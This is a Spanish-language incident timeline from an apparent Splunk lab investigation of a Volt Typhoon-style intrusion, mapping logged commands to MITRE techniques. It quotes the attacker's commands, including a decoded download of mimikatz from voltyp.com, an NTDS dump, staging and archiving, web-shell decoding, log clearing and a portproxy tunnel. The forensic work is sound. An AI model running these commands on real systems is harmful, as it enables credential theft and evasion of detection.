# 📅 Timeline del incidente — Volt Typhoon

[⬅️ README](./README.md) · [📋 Informe](./INCIDENT_REPORT.md) · [🎯 IOCs](./IOCs.md) · [🗺️ MITRE](./MITRE_MAPPING.md)

> **Convenciones**
> - Horas en UTC, tal como las registra Splunk (`_time`).
> - Las IPs proceden del campo `ip_address`. En comandos WMIC **sin** `/node:` corresponden al host donde se ejecutó el comando; en comandos **con** `/node:`, al host de origen, y el objetivo es el nombre que sigue a `/node:`.
> - En las filas de `wevtutil`, el comando completo no aparece en los logs: el EventID procede del campo extraído por Splunk.
> - En **negrita**, los eventos con más peso probatorio.
> - Las comillas tipográficas (“ ”) que aparecen en algunos comandos del log se han normalizado a rectas.
> - El log escribe algunos hosts con dos grafías (`server01` / `server-01`); se citan tal como aparecen.

---

## Resumen

| Métrica | Valor |
|---|---|
| Inicio del dataset | 17/03/2024 (no hay eventos de ninguna cuenta antes) |
| Cambio de contraseña de `dean-admin` (ADSS) | 24/03/2024 11:10:22 |
| Última actividad documentada | 29/03/2024 23:56:30 (cierre del túnel proxy) |
| Cuenta comprometida | `dean-admin` |
| Cuenta creada por el atacante | `voltyp-admin` |
| Hosts implicados | `.153` (probable DC, ver matiz en Fase 3), `.133`, `.129`, `.184`, `webserver-01`, `server01`/`server-01`, `server02`/`server-02` |

---

## Fase 0 — Método: separar ruido de señal

Antes de atribuir actividad al atacante se estableció una línea base:

- **Inicio del dataset, no de la intrusión.** `dean-admin` no tiene eventos antes del 17/03 y a partir de ese día genera entre 17 y 27 diarios. Pero tampoco hay eventos de ninguna otra cuenta antes del 17/03 07:14:30: el salto refleja el inicio de los logs disponibles (la room aporta unas dos semanas), no un cambio de comportamiento. Con estos datos no puede fijarse cuándo empezó el compromiso.
- **Ruido corporativo.** Comparando todas las cuentas, `bill-exec` (173 eventos), `claire-exec` (133), `june-exec` (123) y `sophie-engineering` (140) generan el mismo tipo de comandos WMIC de consulta que `dean-admin` (373). El barrido masivo de `get`/`list` es actividad de fondo de la organización, no evidencia de compromiso por sí solo.
- **Comandos exclusivos.** Normalizando cada comando a su verbo base y buscando los que solo ejecuta `dean-admin`, quedan tres capas:
  1. Ruido compartido: consultas genéricas de hardware, SO y procesos.
  2. Reconocimiento profundo exclusivo: enumeración de los logs Application, System, Security y Directory Service, de cuentas, grupos y recursos de red.
  3. Acciones exclusivas: creación de cuenta, volcado del NTDS, movimiento lateral con `/node:`, arranque de `RemoteRegistry`, `LanmanServer` y `RpcSs`, búsqueda de ficheros `%password%` y proxy con `netsh`.

Las queries están en [SPLUNK_QUERIES.md](./SPLUNK_QUERIES.md#1-metodología-descubrimiento-y-línea-base).

---

## Fase 1 — Actividad previa al 24 de marzo (17–23 de marzo)

<!-- BORRADOR: reescribir con tus palabras -->
Desde el primer día del dataset, mezclado con consultas genéricas que también generan otras cuentas, `dean-admin` ejecuta un reconocimiento más dirigido y exclusivo de esa cuenta: la enumeración de los cuatro logs de Windows (incluido Directory Service, que solo existe en un controlador de dominio) y una búsqueda de ficheros cuyo nombre contiene `password` en la unidad `C:`.

Hay dos lecturas posibles. Si es el atacante, la cuenta ya estaba bajo su control antes del cambio de contraseña del 24/03, y ese cambio no sería el acceso inicial sino la consolidación de un acceso previo. Si es el administrador real, son consultas administrativas poco habituales. La búsqueda de ficheros `password` encaja mal con la segunda lectura, pero los logs no permiten decidir. El 23/03 destaca la consulta repetida de procesos (tres veces en una hora) en `.133`, el host donde al día siguiente se crea la cuenta backdoor.

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| 17/03 07:14:30 | Interfaces de red, excluyendo `.150` (.119) | `wmic nicconfig where "IPAddress!='192.168.1.150'" get caption, ipaddress` | T1016 |
| 17/03 14:45:37 | Enumeración del log Application | `wmic nteventlog where "logfile='Application'" get filename, maximumsize, recordcount` | T1654 |
| 17/03 15:55:42 | Enumeración del log System | `wmic nteventlog where "logfile='System'" get filename, maximumsize, recordcount` | T1654 |
| 17/03 16:55:20 | Enumeración del log Security | `wmic nteventlog where "logfile='Security'" get filename, recordcount` | T1654 |
| 17/03 17:02:32 | Enumeración del log Directory Service (solo existe en DC) | `wmic nteventlog where "logfile='Directory Service'" get filename, maximumsize, recordcount` | T1654 |
| **17/03 17:44:31** | **Búsqueda de ficheros con "password" en el nombre** | `wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name, readable, size /VALUE` | **T1083, T1552.001** |
| 23/03 11:20:45 | Lista de procesos en `.133` (1/3) | `wmic process list brief` | T1057 |
| 23/03 11:23:03 | Lista de procesos en `.133` (2/3) | `wmic process list brief` | T1057 |
| 23/03 12:18:48 | Lista de procesos en `.133` (3/3) | `wmic process list brief` | T1057 |

---

## Fase 2 — Persistence (24 de marzo)

A las 11:10:22 del 24 de marzo, la cuenta `dean-admin` sufre un cambio de contraseña en ADSelfService Plus. La acción en sí es una manipulación de cuenta (T1098). El escenario la presenta como resultado de explotar ADSelfService Plus (T1190), pero el log de ADSS solo registra el cambio de contraseña, sin evidencia del mecanismo de explotación, así que T1190 se mantiene como inferida. Además, como la cuenta ya ejecutaba comandos desde el 17/03 (Fase 1), es posible que el acceso inicial fuera anterior.

Sobre la atribución: el aviso conjunto CISA AA23-144A sobre Volt Typhoon incluye CVE-2021-40539 (ADSelfService Plus) entre las vulnerabilidades explotadas por el actor. Microsoft atribuyó en 2021 otra campaña contra el mismo producto a DEV-0322: un mismo CVE lo explotan varios actores, por lo que el vector por sí solo no identifica a quien lo usa.

Un minuto después (11:11:12), el atacante crea la cuenta `voltyp-admin` mediante WMIC (T1136), un mecanismo distinto e independiente del portal web de ADSelfService Plus. El log no permite saber si es una cuenta local o de dominio, pero su inscripción posterior en ADSS sugiere que es de dominio. En los tres minutos siguientes, a través del portal de autoservicio, inscribe la cuenta, la desbloquea, le cambia la contraseña y le configura la pregunta de seguridad (T1098). Luego registra un factor de autenticación multifactor bajo su control (T1098.005). Controlar los tres factores de recuperación de una cuenta (contraseña, pregunta de seguridad y MFA) significa que, aunque alguien detecte y revierta una parte del compromiso (por ejemplo, resetee la contraseña), el atacante puede recuperar el acceso de inmediato a través de cualquiera de los otros dos mecanismos que también controla.

Cierra la fase, a las 13:55:10, utilizando `wmic nteventlog where logfileName="Application" list brief` para consultar el log de Application del mismo host donde acaba de crear la cuenta, posiblemente para comprobar si su propia acción quedó registrada (comportamiento anti-forense) o para reconocer qué herramientas de seguridad escriben en ese log; la evidencia disponible no permite decidir entre las dos (T1654).

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| **24/03 11:10:22** | **Cambio de contraseña de `dean-admin`** | ADSS: `action_name=Password Change`, `ip_address=192.168.1.134` | **T1098**; T1190 *(inferida, no observada)* |
| **24/03 11:11:12** | **Creación de la cuenta backdoor (.133)** | `wmic useraccount create UserName='voltyp-admin', Password='as&9ha2e$#&@n22n('` | **T1136** |
| 24/03 11:12:26 | Inscripción de `voltyp-admin` en ADSS | ADSS: `action_name=Enrollment` | T1098 |
| 24/03 11:12:53 | Desbloqueo de `voltyp-admin` | ADSS: `action_name=Account Unlock` | T1098 |
| 24/03 11:13:34 | Cambio de contraseña de `voltyp-admin` | ADSS: `action_name=Password Change` | T1098 |
| 24/03 11:14:02 | Configuración de pregunta de seguridad | ADSS: `action_name=Security Question Setup` | T1098 |
| **24/03 11:14:45** | **Registro de MFA controlado por el atacante** | ADSS: `action_name=Multi-factor Authentication (MFA) Setup` | **T1098.005** |
| 24/03 13:55:10 | Consulta del log Application en `.133` | `wmic nteventlog where logfileName="Application" list brief` | T1654 |

---

## Fase 3 — Credential Access y staging del NTDS (25–26 de marzo)

En esta fase suceden tres cadenas en paralelo.

### Staging del NTDS

Se hace una comprobación de espacio en disco en `server01` y `server02` a las 21:30:03 y, a continuación, el volcado de `ntds.dit` (22:44:31), el fichero de base de datos de Active Directory que contiene todas las cuentas del dominio con sus hashes de contraseña, es decir, las credenciales de toda la organización (T1003.003). La salida IFM se dirige a `C:\Windows\Temp\tmp\temp.dit`, que `ntdsutil` trata como carpeta de destino: dentro crea las copias de `ntds.dit` y del registro `SYSTEM`.

`.153` es probablemente el controlador de dominio: el comando se ejecutó sin `/node:`, así que WMIC lo ejecuta localmente, y `ntdsutil` con `ifm create full` solo genera un volcado completo de AD en un controlador de dominio. Hay un matiz que debilita, sin anularla, esta hipótesis: el `xcopy` siguiente se lanza con `/node:webserver-01`, por lo que su ruta de origen (`C:\Windows\Temp\tmp`) es local de `webserver-01`. Los logs no muestran cómo llegó el volcado de `.153` a esa ruta, o si el laboratorio simplifica este paso.

A las 22:45:27 el atacante copia el volcado con `xcopy` a la ruta `inetpub\wwwroot` de `webserver-01`, que no es un destino cualquiera: es un directorio servido por IIS y accesible por HTTP, por lo que se trata de staging remoto (T1074.002). A las 23:47:07 lo comprime con 7z en `cisco-up.7z`, cifrado con contraseña (`-p d5ag0nm@5t3r`), lo que impide que una inspección de contenido en el perímetro vea qué contiene, y partido en volúmenes de 100 MB (`-v100m`, que generaría `cisco-up.7z.001`, `.002`…), coherente con una subida por HTTP (T1560.001). Nota de realismo: 7-Zip espera `-p{contraseña}` sin espacio; tal como está escrito en el log, pediría la contraseña por teclado, por lo que se toma como la contraseña prevista por el laboratorio. A las 02:02:35 renombra `cisco-up.7z` a `cl64.gif`, una extensión de imagen (T1036.008), y a las 02:04:28 borra `C:\Windows\Temp` en `webserver-01` (T1070.004); el archivo camuflado en `wwwroot` permanece.

La cadena se detiene en el staging: no hay evidencia de la petición HTTP que confirmaría la exfiltración real, porque la room no incluye logs web, de proxy ni de red.

### Defense Evasion en paralelo

Mientras preparaba el robo del NTDS, el atacante consultaba qué evidencia de autenticación quedaba registrada, borraba el rastro de sus conexiones RDP y comprobaba que no estaba en un entorno de análisis.

A las 21:48:28 del 25 borra el historial MRU de RDP (`Remove-ItemProperty -Path $registryPath -Name MRU0`), una modificación del registro, no de un log (T1070.007). Entre las 22:01 y las 22:04 del 25 enumera con `wevtutil` los logins exitosos y fallidos (EventID 4624 y 4625, según el campo extraído por Splunk; el comando completo no aparece en los logs) (T1654). El 26 a las 21:15:18 comprueba si el sistema está virtualizado (`Get-ItemProperty ... CurrentControlSet\Control | Select-Object -Property *Virtual*`), para saber si se encuentra en una máquina virtual o un sandbox de análisis antes de seguir actuando (T1497.001), y entre las 21:26 y las 21:31 vuelve a enumerar logins exitosos, fallidos y tickets Kerberos (4624, 4625 y 4769) (T1654).

### Credential Access vía mimikatz

A las 21:51:23 del 26 de marzo, el atacante crea el directorio de trabajo `C:\Temp\db2`, siguiendo el mismo patrón de directorio de trabajo observado en las otras operaciones sensibles del caso (`C:\Windows\Temp\tmp` para el NTDS y `C:\Windows\Temp\faudit` para los datos financieros).

Dos minutos después (21:53:41) ejecuta un comando codificado en base64 (`-E`), con `-W hidden` y `-nop`. Decodificado, el comando descarga `mimikatz.exe` desde `http://voltyp.com/3/tlz/` mediante `Invoke-WebRequest` y lo ejecuta con el módulo `sekurlsa::minidump lsass.dmp` (T1003.001). Es el primer dominio del atacante identificado en todo el caso.

LSASS contiene las credenciales de las cuentas con sesión activa en esa máquina, a diferencia del NTDS, que guarda los hashes de todas las cuentas del dominio y requiere acceso al DC. Por eso ambos volcados son complementarios, no redundantes. El módulo `sekurlsa::minidump` no lee la memoria del sistema en vivo, sino que carga un fichero de volcado ya existente y extrae las credenciales de él.

Las búsquedas por palabra clave (`mimikatz`, `-enc`, `DownloadString`, `IEX`) no devolvieron resultados, porque el contenido codificado no contiene términos legibles. El evento se localizó ordenando los comandos de PowerShell por longitud, ya que un bloque base64 destaca muy por encima de cualquier comando habitual.

El evento que generó `lsass.dmp` no se ha localizado. Se buscó por las herramientas habituales (`procdump`, `rundll32` con `comsvcs.dll`), en los tres sourcetypes disponibles y en la ventana temporal completa sin filtros de contenido, sin resultados. Se documenta como limitación de visibilidad: se confirma el procesado del volcado, no el mecanismo con el que se creó.

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| 25/03 21:30:03 | Comprobación de espacio en disco (.153 → server01, server02) | `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` | T1082 |
| **25/03 21:48:28** | **Borrado del historial MRU de RDP (registro)** | `Remove-ItemProperty -Path $registryPath -Name MRU0 -ErrorAction SilentlyContinue` | **T1070.007** |
| 25/03 22:01:41 | Enumeración de logins exitosos | Comando no capturado; EventID 4624 según campo extraído | T1654 |
| 25/03 22:04:56 | Enumeración de logins fallidos | Comando no capturado; EventID 4625 según campo extraído | T1654 |
| **25/03 22:44:31** | **Volcado del NTDS, local en .153 (probable DC), destino IFM `temp.dit`** | `wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit\""` | **T1003.003** |
| 25/03 22:45:27 | Staging remoto en la raíz web de webserver-01 | `wmic /node:webserver-01 process call create "cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot"` | T1074.002 |
| 25/03 23:47:07 | Compresión cifrada y partida en volúmenes de 100 MB | `wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"` | T1560.001 |
| **26/03 02:02:35** | **Renombrado de `cisco-up.7z` a `cl64.gif`** | `wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif"` | **T1036.008** |
| 26/03 02:04:28 | Borrado de `C:\Windows\Temp` en webserver-01 | `wmic /node:webserver-01 process call create "cmd.exe rd /S C:\Windows\Temp"` | T1070.004 |
| **26/03 21:15:18** | **Comprobación de entorno virtualizado** | `Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" \| Select-Object -Property *Virtual*` | **T1497.001** |
| 26/03 21:26:24 | Enumeración de logins exitosos | Comando no capturado; EventID 4624 según campo extraído | T1654 |
| 26/03 21:29:29 | Enumeración de logins fallidos | Comando no capturado; EventID 4625 según campo extraído | T1654 |
| 26/03 21:31:57 | Enumeración de tickets Kerberos | Comando no capturado; EventID 4769 según campo extraído | T1654 |
| 26/03 21:51:23 | Directorio de trabajo previo a mimikatz | `mkdir C:\Temp\db2` | — |
| **26/03 21:53:41** | **Descarga desde `voltyp.com` y ejecución de mimikatz contra un `lsass.dmp` preexistente** | `-exec bypass -W hidden -nop -E <base64>` → decodificado: `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait` | **T1003.001**, T1105, T1059.001 |

---

## Fase 4 — Credential Access: credenciales en el registro (27 de marzo)

Los tres programas consultados son herramientas de acceso remoto. El atacante no busca datos de negocio, sino credenciales y destinos para seguir moviéndose por la red. Por eso la técnica es T1552.002 (Credentials in Registry) y no solo T1012 (Query Registry): el `reg query` es el medio; la búsqueda de credenciales, la finalidad.

A las 19:24:02 del 27 de marzo se consulta la clave de OpenSSH en el registro (`reg query hklm\software\OpenSSH`) y, cinco minutos después (19:29:40), su subclave `Agent` (`reg query hklm\software\OpenSSH\Agent`) (T1552.002). El agente SSH de Windows guarda las claves privadas que se le añaden en `HKCU\Software\OpenSSH\Agent\Keys`, protegidas con DPAPI. Las consultas observadas son a `HKLM`, donde no residen esas claves, así que indican más bien un reconocimiento de la instalación de OpenSSH que una extracción.

A continuación, el atacante realiza cuatro consultas sobre las claves de RealVNC en apenas quince minutos: primero la clave raíz (`reg query hklm\software\realvnc`, 20:46:39), después `realvnc\vncserver` (20:56:21), luego `realvnc\Allusers` (21:01:36) y, catorce segundos más tarde, `realvnc\Allusers\vncserver` (21:01:50) (T1552.002). La progresión, de lo general a lo específico, indica un recorrido del árbol del registro nivel a nivel en busca de una clave concreta. RealVNC almacena en el registro su contraseña de acceso ofuscada con una clave fija y conocida, por lo que, si se obtiene, es recuperable.

A las 22:26:05 se consultan las sesiones guardadas de PuTTY (`reg query hkcu\software\dean-admin\putty\session`, una ruta propia del laboratorio, no la estándar de PuTTY), que contienen los hosts y usuarios a los que se conecta el administrador. Su valor principal es saber hacia dónde podría moverse lateralmente.

Siete minutos después de la última consulta (22:33:29 y 22:34:51), vuelve a buscar logins exitosos con `wevtutil` (EventID 4624) (T1654). Encaja con el patrón de la Fase 3: tras una actividad sensible, comprueba qué evidencia de autenticación ha quedado registrada.

Los logs registran las consultas, pero no su resultado, por lo que no puede confirmarse si se obtuvieron credenciales.

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| 27/03 19:24:02 | Consulta de la clave raíz de OpenSSH | `reg query hklm\software\OpenSSH` | T1552.002 |
| 27/03 19:29:40 | Consulta del agente OpenSSH | `reg query hklm\software\OpenSSH\Agent` | T1552.002 |
| 27/03 20:46:39 | RealVNC: clave raíz (1/4) | `reg query hklm\software\realvnc` | T1552.002 |
| 27/03 20:56:21 | RealVNC: vncserver (2/4) | `reg query hklm\software\realvnc\vncserver` | T1552.002 |
| 27/03 21:01:36 | RealVNC: Allusers (3/4) | `reg query hklm\software\realvnc\Allusers` | T1552.002 |
| 27/03 21:01:50 | RealVNC: Allusers\vncserver (4/4) | `reg query hklm\software\realvnc\Allusers\vncserver` | T1552.002 |
| 27/03 22:26:05 | Sesiones guardadas de PuTTY (ruta propia del laboratorio) | `reg query hkcu\software\dean-admin\putty\session` | T1552.002 |
| 27/03 22:33:29 | Enumeración de logins exitosos (1/2) | Comando no capturado; EventID 4624 según campo extraído | T1654 |
| 27/03 22:34:51 | Enumeración de logins exitosos (2/2) | Comando no capturado; EventID 4624 según campo extraído | T1654 |

---

## Fase 5 — Collection: datos financieros (27 de marzo)

<!-- BORRADOR: reescribir con tus palabras -->
A las 23:44:10 se crea el directorio `C:\Windows\Temp\faudit`. Es el tercer caso del mismo patrón: un directorio de trabajo creado inmediatamente o pocos minutos antes de una operación sensible (`C:\Windows\Temp\tmp`, en el mismo comando que el volcado del NTDS, y `C:\Temp\db2`, dos minutos antes de mimikatz). Aquí la copia llega unos ocho minutos después.

Entre las 23:51:55 y las 23:52:49 se copian a ese directorio tres ficheros de `C:\ProgramData\FinanceBackup`: `2022.csv`, `2023.csv` y `2024.csv` (T1005). `FinanceBackup` no es una ruta estándar de Windows, sino una carpeta de copias de seguridad financieras de la organización, y en esta fase no aparece ninguna búsqueda previa que explique cómo la localizó. Las tres copias se suceden en menos de un minuto, con 20–34 segundos entre ellas, lo que sugiere comandos lanzados en secuencia o un script más que una navegación manual.

A diferencia de la cadena del NTDS, aquí no hay compresión, renombrado ni movimiento a un servidor web: la evidencia se detiene en la copia local. No puede afirmarse que estos ficheros salieran de `faudit` ni que se exfiltraran.

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| 27/03 23:44:10 | Creación del directorio de staging | `New-Item -ItemType Directory -Path "C:\Windows\Temp\faudit" -ErrorAction SilentlyContinue` | — |
| 27/03 23:51:55 | Copia de datos financieros de 2022 | `Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"` | T1005 |
| 27/03 23:52:15 | Copia de datos financieros de 2023 | `Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv" -Destination "C:\Windows\Temp\faudit\2023.csv"` | T1005 |
| 27/03 23:52:49 | Copia de datos financieros de 2024 | `Copy-Item -Path "C:\ProgramData\FinanceBackup\2024.csv" -Destination "C:\Windows\Temp\faudit\2024.csv"` | T1005 |

---

## Fase 6 — Persistencia con web shell (28–29 de marzo)

<!-- BORRADOR: reescribir con tus palabras -->
El 28/03 a las 21:19:23 el atacante decodifica con `certutil` un fichero llamado `ntuser.ini` a `C:\Windows\Temp\iisstart.aspx` (T1140). Hay doble camuflaje: el contenido codificado se guardó con el nombre de un fichero legítimo del perfil de usuario de Windows, y el resultado imita el nombre de la página de bienvenida de IIS (`iisstart.htm`) (T1036.005). El log no indica en qué host se ejecutó.

Al día siguiente, a las 19:47:43, copia ese fichero a la raíz web de `server-02` con el nombre `AuditReport.jspx` (T1570, T1505.003). Es el mismo artefacto en dos momentos: creado como `iisstart.aspx` y desplegado como `AuditReport.jspx`, un nombre de informe con apariencia inocua (T1036.005). Las 22,5 horas entre creación y despliegue son compatibles con una preparación previa. Matiz: IIS no ejecuta ficheros `.jspx` sin un handler específico, así que no puede confirmarse que el web shell fuera funcional en `server-02`.

El 28/03 a las 14:18:49 consta además un `Password Reset` de `dean-admin` en ADSS. Con la evidencia disponible no puede determinarse si fue una acción de remediación o del atacante.

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| 28/03 14:18:49 | Reset de contraseña de `dean-admin` (origen no determinado) | ADSS: `action_name=Password Reset` | — |
| **28/03 21:19:23** | **Decodificación del web shell desde base64** | `certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx` | **T1140, T1036.005** |
| **29/03 19:47:43** | **Despliegue del web shell en server-02** | `Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"` | **T1505.003, T1570, T1036.005** |

---

## Fase 7 — Limpieza de logs y Command and Control (29 de marzo)

<!-- BORRADOR: reescribir con tus palabras -->
Entre las 18:52 y las 18:53 el atacante vuelve a enumerar logins exitosos y tickets Kerberos con `wevtutil` (T1654). A las 22:04:23, como `CTRL-ACC\dean-admin`, ejecuta `wevtutil cl Application Security Setup System` para borrar esos cuatro logs (T1070.001). El log registra el comando, no su resultado; además, `wevtutil cl` admite un único log por llamada, así que tal como está escrito es una simplificación del laboratorio. El log Directory Service, enumerado el 17/03, no aparece en el comando.

A las 23:13:09, ya después del borrado, crea un `portproxy` en `server-01` que escucha en `0.0.0.0:50100` y reenvía el tráfico a `10.2.30.1:8443` (T1090.001), pasando en el comando las credenciales de `dean-admin` en claro (T1078.002). Lo elimina 43 minutos después (23:56:30): un túnel de uso puntual, no una configuración persistente. `10.2.30.1` es una dirección privada (RFC 1918) fuera del rango `192.168.1.0/24` observado en todo el caso: otro segmento interno o un extremo alcanzable a través de una VPN o túnel. Los logs disponibles no permiten saber cuál.

| Hora | Evento | Comando/Query | Técnica MITRE |
|---|---|---|---|
| 29/03 18:52:19 | Enumeración de logins exitosos | Comando no capturado; EventID 4624 según campo extraído | T1654 |
| 29/03 18:53:03 | Enumeración de tickets Kerberos | Comando no capturado; EventID 4769 según campo extraído | T1654 |
| **29/03 22:04:23** | **Borrado de cuatro logs de Windows** | `wevtutil cl Application Security Setup System` | **T1070.001** |
| **29/03 23:13:09** | **Apertura del túnel hacia 10.2.30.1:8443** | `wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1"` | **T1090.001**, T1078.002 |
| 29/03 23:56:30 | Cierre del túnel | `wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create "cmd.exe /c netsh interface portproxy delete v4tov4 listenport=50100 listenaddress=0.0.0.0"` | T1090.001 |

---

## Hipótesis investigadas y descartadas

| Hipótesis | Resultado | Evidencia |
|---|---|---|
| `192.168.1.134` es un IOC exclusivo del atacante | ❌ Descartada | Aparece también con siete cuentas legítimas, de forma esporádica. Lo anómalo es la densidad de acciones en minutos, no la IP. |
| `june-exec` es una segunda cuenta comprometida (por su actividad WMIC) | ❌ Descartada | Volumen y variedad de comandos equivalentes a otras cuentas no comprometidas. |
| `june-exec` comprometida (por 29 desbloqueos en 10 días) | ❌ Descartada | Está por debajo de seis de las otras cuentas, incluida `dean-admin` (41): es ruido generalizado. |
| `calc.exe` prueba la ejecución remota del atacante | ❌ Descartada | `sophie-engineering` ejecuta el mismo comando. |
| `notepad.exe` es un IOC | ❌ Descartada | Lo ejecutan tres cuentas. |
| El arranque del servicio `winrm` es del atacante | ❌ Descartada | Lo ejecuta `sophie-engineering`. |
| El barrido WMIC masivo es reconocimiento del atacante | ❌ Descartada como evidencia por sí sola | Lo generan al menos cinco cuentas; solo los comandos exclusivos de `dean-admin` se tratan como señal. |

## Preguntas abiertas

- Cuándo y cómo se obtuvo el control de `dean-admin` (los logs empiezan el 17/03 y la cuenta ya muestra actividad exclusiva ese día).
- Origen del volcado `lsass.dmp`.
- Naturaleza de `10.2.30.1`.
- Si el NTDS o los CSV financieros llegaron a exfiltrarse.
- Por qué el log Directory Service se enumeró pero no figura en el comando de borrado.
- Si el web shell `AuditReport.jspx` llegó a ser funcional.
